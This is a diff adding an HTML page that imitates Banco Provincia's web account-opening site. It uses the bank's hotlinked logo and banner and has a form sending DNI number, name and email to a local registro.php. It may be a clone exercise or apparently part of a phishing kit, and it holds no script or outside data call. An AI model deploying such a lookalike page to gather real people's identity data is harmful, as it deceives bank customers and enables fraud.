@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apertura de Cuenta Web - Banco Provincia</title>
+    <link rel="stylesheet" href="style.css">
+</head> 
+<body>
+    <header class="navbar">
+        <div class="logo">
+            <img src="https://www.bancoprovincia.com.ar/CDN/Get/logo_2021_S" alt="Banco Provincia">
+        </div>
+    </header>
+
+      <div class="foto-mujer">
+            <img class="ft" src="https://www.bancoprovincia.com.ar/CDN/Get/PP_Mujer_Banner_Home_L" alt="Mujer Banco Provincia">
+        </div>
+
+    <div class="contenido">
+        <section class="info">
+            <h1>Apertura de Cuenta Web</h1>
+            <p>A través de este sitio podés abrir:</p>
+            <ul>
+                <li>Cuenta Haberes</li>
+                <li>Cuenta Provincia Ahorro</li>
+                <li>Cuenta Gratuita Universal</li>
+            </ul>
+
+            <div class="pasos">
+                <div class="paso">
+                    <span class="numero">1</span>
+                    <div>
+                        <h3>Registro</h3>
+                        <p>Completá tus datos personales.</p>
+                    </div>
+                </div>
+                <div class="paso">
+                    <span class="numero">2</span>
+                    <div>
+                        <h3>Validación</h3>
+                        <p>Confirmá tu correo electrónico.</p>
+                    </div>
+                </div>
+                <div class="paso">
+                    <span class="numero">3</span>
+                    <div>
+                        <h3>Código de acceso</h3>
+                        <p>Ingresá el código que recibirás por correo para continuar.</p>
+                    </div>
+                </div>
+                <div class="paso">
+                    <span class="numero">4</span>
+                    <div>
+                        <h3>Finalización</h3>
+                        <p>Completá los datos complementarios para activar tu cuenta.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="formulario">
+            <h2>Registro</h2>
+            <p>Ingresá tus datos para comenzar</p>
+    <form action="registro.php" method="POST">
+    <input type="text" name="dni" placeholder="Número DNI" required>
+    <div class="fila">
+        <input type="text" name="apellido" placeholder="Apellido" required>
+        <input type="text" name="nombre" placeholder="Nombre" required>
+    </div>
+    <input type="email" name="email" placeholder="Email" required>
+    <button type="submit" class="validar">Validar</button>
+</form>
+
+        </section>
+
+      
+    </div>
+
+    <footer class="footer">
+        <p>© 2025 Banco Provincia. Todos los derechos reservados.</p>
+        <div class="links-footer">
+            <a href="#">Términos y condiciones</a>
+            <a href="#">Política de privacidad</a>
+            <a href="#">Ayuda</a>
+        </div>
+    </footer>
+</body>
+</html>
